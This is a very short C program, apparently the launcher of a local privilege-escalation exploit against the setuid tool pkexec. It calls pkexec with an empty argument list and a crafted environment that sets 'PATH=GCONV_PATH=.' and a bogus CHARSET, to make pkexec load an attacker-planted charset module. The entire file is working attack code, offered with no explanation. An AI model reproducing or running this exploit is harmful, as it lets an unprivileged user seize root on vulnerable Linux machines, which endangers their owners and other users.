#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main() {
	char* argv[1] = {0};
	char* envp[5] = {"exploit", "PATH=GCONV_PATH=.", "SHELL=nonsense", "CHARSET=lobjan", 0};

	execvpe("pkexec", argv, envp);
}
